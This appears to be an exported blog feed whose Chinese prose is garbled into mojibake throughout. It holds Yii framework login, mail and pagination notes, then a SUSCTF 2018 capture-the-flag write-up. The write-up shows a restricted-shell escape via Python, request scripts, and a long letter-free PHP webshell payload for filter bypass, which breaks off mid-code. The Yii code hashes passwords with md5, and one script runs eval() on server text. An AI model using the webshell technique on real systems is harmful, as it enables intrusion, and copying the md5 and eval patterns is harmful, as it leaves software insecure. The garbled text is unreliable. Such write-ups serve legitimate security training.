åœ¨<code>render</code>é‡Œé¢çš„<code>â€˜modelsâ€™</code>å‚æ•°</p><p>å¯¹äºåå°ç™»å½•é¡µé¢æ³¨æ„æ¥æ”¶æ•°æ®çš„é¡µé¢ï¼Œç„¶åæˆ‘ä»¬åœ¨é‡Œé¢åˆ©ç”¨yiiæ¡†æ¶çš„requestæ¨¡å—äº†ï¼Œåƒä¸‡è¦è®°å¾—è®°å¾—å‰é¢åŠ ä¸Šuse Yii,<br>æˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸‹é¢ç”¨è¿™æ ·çš„è¯­å¥å»åˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Yii::$app-&gt;request-&gt;isPost)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨å®šä¹‰å‡½æ•°<code>rules</code>å»å®šä¹‰è§„åˆ™ï¼Œè¿™ä¸ªè§„åˆ™åœ¨è°ƒç”¨<code>validate</code>çš„æ—¶å€™ä¼šè°ƒç”¨<br>è¯¦æƒ…å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„é“¾æ¥<br><a href="https://blog.csdn.net/luze_1226/article/details/65633923" target="_blank" rel="noopener">https://blog.csdn.net/luze_1226/article/details/65633923</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span>[</span><br><span class="line">[<span class="string">'adminuser'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'ç®¡ç†å‘˜è´¦å·ä¸èƒ½ä¸ºç©º'</span>],</span><br><span class="line">[<span class="string">'adminpass'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'ç®¡ç†å‘˜å¯†ç ä¸èƒ½ä¸ºç©º'</span>],</span><br><span class="line">[<span class="string">'rememberMe'</span>,<span class="string">'boolean'</span>],</span><br><span class="line">[<span class="string">'adminpass'</span>,<span class="string">'validatePass'</span>],</span><br><span class="line">];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†å¯†ç æ£€éªŒæ²¡æœ‰å¯¹åº”çš„æ–¹æ³•ï¼Œæ‰€ä»¥å¾—è‡ªå®šä¹‰ä¸€ä¸ª<code>validatePass</code>ï¼Œä¹Ÿå°±æ˜¯è¯´è§„åˆ™æ˜¯æœ‰ä¸€éƒ¨åˆ†å¯ä»¥è‡ªå®šä¹‰çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validatePass</span><span class="params">()</span> //æ•°æ®çš„éªŒè¯</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;hasErrors())</span><br><span class="line">                &#123;</span><br><span class="line">                    $data = <span class="keyword">self</span>::find()-&gt;where(<span class="string">'adminuser=:user and adminpass=:pass'</span>,[<span class="string">":user"</span>=&gt;<span class="keyword">$this</span>-&gt;adminuser,<span class="string">":pass"</span>=&gt;md5(<span class="keyword">$this</span>-&gt;adminpass)])-&gt;one();</span><br><span class="line">                    <span class="keyword">if</span>(isNull($data)) <span class="comment">//åˆ¤æ–­æ•°æ®æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;addError(<span class="string">"adminpass"</span>,<span class="string">"ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ï¼"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·loginé‡Œé¢å°±å¯ä»¥åšç‚¹æœ‰æ„ä¹‰çš„äº‹æƒ…äº†ï¼Œä½†æ˜¯å¦‚æœæƒ³è®©åå°é¡µé¢æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯çš„è¯æˆ‘ä»¬åªéœ€è¦åœ¨æ¨¡æ¿æ–‡ä»¶é‡Œé¢çš„beginé‡Œé¢çš„<code>template</code>çš„<code>{input}</code>çš„å‰é¢æˆ–è€…åé¢æ·»åŠ <code>{error}</code>å³å¯ï¼Œä½ç½®ä»»é€‰å“ªé‡Œå¥½çœ‹æ”¾å“ªé‡Œ</p><h3 id="ç”ŸæˆåŠ¨æ€url"><a href="#ç”ŸæˆåŠ¨æ€url" class="headerlink" title="ç”ŸæˆåŠ¨æ€url"></a>ç”ŸæˆåŠ¨æ€url</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&lt;?php  echo yii\Helpers\Url::to(['public/logout']); ?&gt;"</span> role=<span class="string">"button"</span>&gt;</span><br></pre></td></tr></table></figure><p> <code>Yii::$app-&gt;end();</code>è¿™å¥åœ¨è·³è½¬ä¹‹åçš„ä½œç”¨çœ‹ä¸€çœ‹ä¸‹é¢è¿™ä¸ªç½‘å€ï¼Œç›¸å½“äºdieæ“ä½œ<br><a href="http://www.yiichina.com/question/2182" target="_blank" rel="noopener">http://www.yiichina.com/question/2182</a></p><p>åœ¨æŸä¸ªmodelsé‡Œçš„è¿™ä¸ªä¸œè¥¿<code>if($this-&gt;load($data)&amp;&amp; $this-&gt;validate())</code><br>å¯ä»¥çœ‹ä¸‹é¢çš„é“¾æ¥<a href="http://www.yiichina.com/question/955" target="_blank" rel="noopener">http://www.yiichina.com/question/955</a><br>å…ˆæ˜¯<code>load</code>æ˜¯å¡«å……è§„åˆ™é‡Œé¢çš„ä¸œè¥¿ï¼Œè€Œ<code>validate</code>å°±æ˜¯ç”¨æ¥æ£€æŸ¥è§„åˆ™çš„<br>ä½†æ˜¯ä¸€æ—¦rulesè§„åˆ™å¤šèµ·æ¥ï¼Œè°ƒç”¨çš„æ—¶å€™ä¼šæŠŠè§„åˆ™é‡Œé¢çš„ä¸œè¥¿å…¨æ£€æŸ¥ä¸€éï¼Œéå¸¸è€—æ—¶ã€‚ã€‚æ­¤æ—¶è¦å¢åŠ åœºæ™¯æ¥æé«˜æ•ˆç‡<br>åœ¨æ¯ä¸ªè‡ªå®šä¹‰çš„æ£€æŸ¥å‡½æ•°é‡Œé¢æ·»åŠ <code>$this-&gt;scenario = &quot;yourname&quot;</code>,å¹¶ä¸”åœ¨è§„åˆ™é‡Œé¢æ·»åŠ <code>on</code>å‚æ•°å»è§„å®šåœºæ™¯<br>å¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'adminuser'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'ç®¡ç†å‘˜è´¦å·ä¸èƒ½ä¸ºç©º'</span>,<span class="string">'on'</span>=&gt;[<span class="string">'login'</span>,<span class="string">'seekpass'</span>]]</span><br></pre></td></tr></table></figure><h3 id="Emailå‘é€ç±»æ“ä½œ"><a href="#Emailå‘é€ç±»æ“ä½œ" class="headerlink" title="Emailå‘é€ç±»æ“ä½œ"></a>Emailå‘é€ç±»æ“ä½œ</h3><p>åœ¨web.phpé‡Œé¢æ‰¾åˆ°mailerè¿™ä¸ªé€‰é¡¹ï¼Œè¿™ä¸ªä¸œè¥¿å°±æ˜¯å¯¹emailå‘é€çš„è®¾ç½®ã€é‚®ç®±çš„é…ç½®è¯¦æƒ…çœ‹<br><a href="https://blog.csdn.net/cjqh_hao/article/details/48501897" target="_blank" rel="noopener">https://blog.csdn.net/cjqh_hao/article/details/48501897</a><br><a href="http://www.yiichina.com/tutorial/320" target="_blank" rel="noopener">http://www.yiichina.com/tutorial/320</a></p><p>è¿˜è¦è®°å¾—é…ç½®é‡Œé¢çš„passwordå¡«å†™çš„æ˜¯æˆæƒå¯†ç å•Šã€‚ã€‚ã€‚ã€‚ã€‚ã€‚çœŸå¿ƒç´¯è¿™ä¸œè¥¿ï¼Œè§£å†³æ–¹æ¡ˆ<br><a href="http://www.yii-china.com/post/detail/10.html" target="_blank" rel="noopener">http://www.yii-china.com/post/detail/10.html</a></p><p>æ³¨æ„åœ¨å‘é€é‚®ä»¶çš„å‡½æ•°ä¸­ä¹Ÿå°±æ˜¯mailerå‡½æ•°è°ƒç”¨<code>compose</code>å‚æ•°çš„<code>view</code>å‚æ•°åƒä¸‡ä¸èƒ½å¿˜è®°ï¼Œä¸€å®šè¦åœ¨mailæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä½ å¯¹åº”çš„è§†å›¾æ–‡ä»¶ï¼Œä¸è¦åƒæˆ‘ä¸€æ ·ç›´æ¥åœ¨layoutsé‡Œé¢æ–°å»ºäº†ã€‚ã€‚ã€‚è€Œä¸”è¿™é‡Œé¢çš„å†…å®¹å°±æ˜¯ä½ å‘é€é‚®ä»¶çš„å†…å®¹ï¼Œé‡Œé¢æœ‰ä¸ªå‡½æ•°ä¹Ÿè¦æ³¨æ„ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yii::$app-&gt;session-&gt;setFlash(<span class="string">'info'</span>,<span class="string">'ç”µå­é‚®ä»¶å·²ç»å‘é€æˆåŠŸï¼Œè¯·æŸ¥æ”¶'</span>);</span><br></pre></td></tr></table></figure><p>è¿™å¥è¯ä¸è¦å¿˜è®°åœ¨å¯¹åº”çš„è§†å›¾æ–‡ä»¶é‡Œé¢åŠ ä¸Šï¼Œæˆ‘è‡ªå·±æ˜¯publicä¸‹é¢çš„seekpassword.phpæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(Yii::$app-&gt;session-&gt;hasFlash(<span class="string">'info'</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> Yii::$app-&gt;session-&gt;getFlash(<span class="string">'info'</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸ç„¶ä¸ä¼šå‡ºç°æˆåŠŸçš„ä¿¡æ¯çš„ï¼Œè¿™é‡ŒçœŸçš„æ˜¯å¯¹yiiæ¡†æ¶å¤ªä¸ç†Ÿæ‚‰äº†ï¼Œåªèƒ½åœ¨é¡¹ç›®å®Œæˆè¿‡ç¨‹ä¸­æ…¢æ…¢æ‘¸ç´¢</p><h3 id="åˆ†é¡µå¤„ç†"><a href="#åˆ†é¡µå¤„ç†" class="headerlink" title="åˆ†é¡µå¤„ç†"></a>åˆ†é¡µå¤„ç†</h3><p>è¿ç”¨äº†yiiæ¡†æ¶ä¸‹çš„çš„ä¸€ä¸ªç»„ä»¶<br>åœ¨å¯¹åº”çš„æ§åˆ¶å™¨é‡Œé¢åŠ ä¸Š<code>use yii\data\Pagination;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$model = Admin::find();</span><br><span class="line">           $count = $model-&gt;count();</span><br><span class="line">           $pageSize = Yii::$app-&gt;params[<span class="string">'pageSize'</span>][<span class="string">'manage'</span>];</span><br><span class="line">           $pager = <span class="keyword">new</span> Pagination([<span class="string">'totalCount'</span>=&gt; $count, <span class="string">'pageSize'</span>=&gt; $pageSize]);</span><br><span class="line">           $managers = $model-&gt;offset($pager-&gt;offset)-&gt;limit($pager-&gt;limit)-&gt;all();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">"managers"</span>,[<span class="string">'managers'</span>=&gt;$managers,<span class="string">'pager'</span>=&gt; $pager]);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢æŠŠæŸ¥æ‰¾çš„å†…å®¹æ”¾è¿›æ–°å»ºçš„<code>Pagination</code>å¯¹è±¡é‡Œé¢ï¼Œå¯¹åº”çš„<code>pageSize</code>é‡Œé¢çš„è®¾ç½®æ˜¯åˆ†é¡µï¼Œå¯ä»¥é¢„å…ˆæ”¾è¿›è®¾ç½®æ–‡ä»¶paramsé‡Œé¢ï¼Œå†é€šè¿‡è°ƒç”¨<code>Yii::$app-&gt;params</code>çš„æ–¹å¼å»å®ç°å°±å¥½</p><p>è®°å¾—è¦åœ¨å¯¹åº”çš„è§†å›¾æ–‡ä»¶é‡Œé¢æ·»åŠ åˆ†é¡µçš„è¾“å‡ºè¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> yii\widgets\LinkPager::widget([<span class="string">'pagination'</span> =&gt; $pager, <span class="string">'prevPageLabel'</span>=&gt; <span class="string">'&amp;#8249;'</span>,<span class="string">'nextPageLabel'</span> =&gt; <span class="string">'&amp;#8250;'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> åé¢çš„ä¸¤ä¸ª<code>Label</code>å‚æ•°åªæ˜¯å›¾æ ‡çš„å½¢çŠ¶ï¼Œéšæ„å°±å¥½</p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Yii </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SUSCTF 2018 åšé¢˜è®°å½•</title>
      <link href="/susctf2018-wp.html"/>
      <url>/susctf2018-wp.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¥½ä¹…éƒ½æ²¡åšé¢˜ç›®ï¼Œåˆšå¥½ä¸Šæ¬¡æ­çš„é¢˜ç›®è¿˜åœ¨ï¼Œå°±ä¸è¦æµªè´¹äº†ï¼Œè®°å½•è®°å½•åšé¢˜è¿‡ç¨‹å§</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="minBash"><a href="#minBash" class="headerlink" title="minBash"></a>minBash</h3><p>è¿™ä¸ªé¢˜ç›®è€ƒçš„ç‚¹æ˜¯æ²™ç›’ç»•è¿‡ï¼Œç¬¬ä¸€æ¬¡ç©è¿™ä¸ªä¸œè¥¿ï¼Ÿï¼Ÿåæ­£è¿›å»ä¹‹åå°è¯•ls,cat,fileç­‰å„ç§é‚£ä¸ªå‘½ä»¤å‡æ— æ•ˆæœï¼Œéƒ½ä¼šæ˜¾ç¤º<br><code>-rbash: ls: command not found</code><br>å‘ç°æœ‰ä¸€ç¯‡å¥½æ–‡ç« ï¼Œæœ‰ç©ºç…ç…:<code>http://cauc.me/2017/11/16/pythonæ²™ç›’ç»•è¿‡/</code><br>ä¸€å¼€å§‹è°·æ­Œä¸€ä¸‹ï¼Œå‘ç°è§£å†³åŠæ³•æ˜¯è¿™æ ·çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¹‹åå‘ç°è¿˜æ˜¯ä¸è¡Œæ˜¾ç¤º <code>-rbash: PATH: readonly variable</code><br>æˆ‘ä»¬å¯ä»¥å°è¯•pythoné‡Œé¢çš„åº“å»æ‰§è¡Œï¼Œç”¨çš„æ˜¯<code>os</code>åº“é‡Œé¢çš„<code>listdir</code>å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.listdir(<span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„å‡½æ•°é‡Œé¢çš„<code>.</code>ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œè€Œ<code>..</code>ä»£è¡¨çš„æ˜¯ä¸Šçº§ç›®å½•ï¼Œä¹Ÿå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„<br>å¾—åˆ°å½“å‰ç›®å½•çš„ç»“æœä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;.bash_logout&apos;, &apos;.profile&apos;, &apos;.bashrc&apos;, &apos;bin&apos;, &apos;c8049f64c8080af25f414b15cb6f80c3&apos;]</span><br></pre></td></tr></table></figure><p>æ£€éªŒä¸€ä¸‹é‚£ä¸ªä¸€ä¸²çš„ä¸œè¥¿æ˜¯æ–‡ä»¶è¿˜æ˜¯æ–‡ä»¶å¤¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isfile(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>)</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯æ–‡ä»¶ï¼Œè¿™é‡Œæä¾›ä¸¤ç§æ–¹æ³•è¯»å–æ–‡ä»¶ï¼Œ<br>ç¬¬ä¸€ç§ç›´æ¥ç”¨Pythonè¯»å–æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;\n&apos;</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æ˜¯ï¼Œè¿”å›åˆ°Linuxå‘½ä»¤è¡Œç”¨stringså‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings c8049f64c8080af25f414b15cb6f80c3</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;</span><br></pre></td></tr></table></figure><h3 id="faster"><a href="#faster" class="headerlink" title="faster"></a>faster</h3><p>é¢˜ç›®è¯´çš„å¿«ä¸€ç‚¹ï¼Œé‚£å°±è¯•ä¸€ä¸‹æŠ“åŒ…å¥½äº†ï¼Œç›´æ¥å¾—åˆ°flagï¼Œè¿™é‡Œæ˜¯å­˜åœ¨<code>302è·³è½¬</code>çš„ï¼Œä¼šè·³è½¬åˆ°<code>1ndex.php</code>ï¼Œä¸€å¼€å§‹æˆ‘ä¸€ç›´è¿™ä¸ªé¡µé¢æŠ“åŒ…å¯å‘äº†ï¼Œä»¥åè¦æ³¨æ„ç›´æ¥ä»æ‰“å¼€é¢˜ç›®åœ°å€é‚£ä¸€åˆ»å¼€å§‹æŠ“åŒ…-_-||<br><img src="https://s1.ax1x.com/2018/06/05/C7cZ1H.png" alt="C7cZ1H.png"></p><p>è¿˜æœ‰å¦ä¸€ç§åšæ³•å°±æ˜¯ç›´æ¥<code>curl</code>ä¸€æ³¢å°±å¥½äº†ã€‚ã€‚ã€‚ä¸å¤šè¯´ï¼Œæ°´é¢˜ä¸€ä¸ª</p><h3 id="put"><a href="#put" class="headerlink" title="put"></a>put</h3><p>æ‰“å¼€é¢˜ç›®å‘ç°è¿™æ ·ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put me a message then you can get the flag</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®æ˜¯è€ƒäº†ä¼ å‚çš„æ–¹å¼ï¼Œæ°´é¢˜ã€‚ã€‚ã€‚ã€‚<br>æˆ‘ç”¨çš„ä¸¤ç§åŠæ³•<br>ç¬¬ä¸€ç§<br>ç›´æ¥åˆ©ç”¨ç«ç‹çš„<code>F12</code>æ’ä»¶å»å®Œæˆ<code>putç±»å‹</code>çš„ä¼ å‚<br><img src="https://s1.ax1x.com/2018/06/05/C7cmjA.png" alt="C7cmjA.png"><br>æŸ¥çœ‹å›åº”å‘ç°ä¸€æ®µbase64ï¼Œ<code>U3VzY3Rme3JlcXVlc3RfaW5fcHV0X21ldGhvZH0=</code>ï¼Œè§£ç å¾—åˆ°flag</p><p>ç¬¬äºŒç§åˆ©ç”¨pythonå†™è„šæœ¬ä¸Šä¼ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4447'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line">ans = res.put(url=url,data=<span class="string">'message'</span>)</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(ans.content)</span><br></pre></td></tr></table></figure><h3 id="calculator"><a href="#calculator" class="headerlink" title="calculator"></a>calculator</h3><p><img src="https://s1.ax1x.com/2018/06/05/C7cktO.png" alt="C7cktO.png"><br>è¿™ä¸ªé¢˜ç›®æ˜æ˜¾è€ƒçš„æ˜¯è„šæœ¬é¢˜ã€‚ã€‚ã€‚æ²¡å­¦è¿‡bs,åªèƒ½ä¸€ç›´ç”¨<code>requests</code>åº«äº†ï¼Œè¿‡æ®µæ—¶é—´è¿˜æ˜¯å¾—å­¦ä¹ ä¸€ä¸‹bs</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4441'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line"></span><br><span class="line">ans1 = res.get(url)</span><br><span class="line"><span class="comment"># print ans1.content</span></span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans1.content)</span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">ans = eval(s)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">ans2 = res.post(url=url,data=&#123;<span class="string">"ans"</span>:ans&#125;).content</span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans2)</span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">ans = eval(s)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> ans2</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>è¿™ä¸ªé¢˜ç›®è¿‡æ»¤äº†å­—æ¯ï¼Œè¿™é‡Œå‚è€ƒäº†å‡ ç¯‡å…³äºwebshellçš„æ–‡ç« ,å„ç§è›‡çš®æ“ä½œã€‚ã€‚ã€‚ã€‚<br><a href="http://www.freebuf.com/articles/web/155891.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/155891.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br>è¿™æ˜¯è‡ªå·±å†™çš„payloadï¼Œç›´æ¥urlencodeä¹‹åç”¨bpå‘åŒ…å¾—åˆ°flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; </span><br><span class="line"> </span><br><span class="line">$_=@$_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">$__=$_; </span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; </span><br><span class="line">$___ = $_; </span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__= $__.$___; </span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__= $__.$___; </span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__= $__.$___.<span class="string">'_'</span>; </span><br><span class="line"></span><br><span class="line">$__ =$__.$__[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">$__ =$__.$__[<span class="number">2</span>];</span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; </span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;</span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;</span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; </span><br><span class="line"> </span><br><span class="line">$_=@$_[<span class="number">3</span>];</span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____ =<span class="string">''</span>;</span><br><span class="line">$____ = $____.$___;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____ = $____ .$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$____  = $____ .$___;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____  = $____ .$___.<span 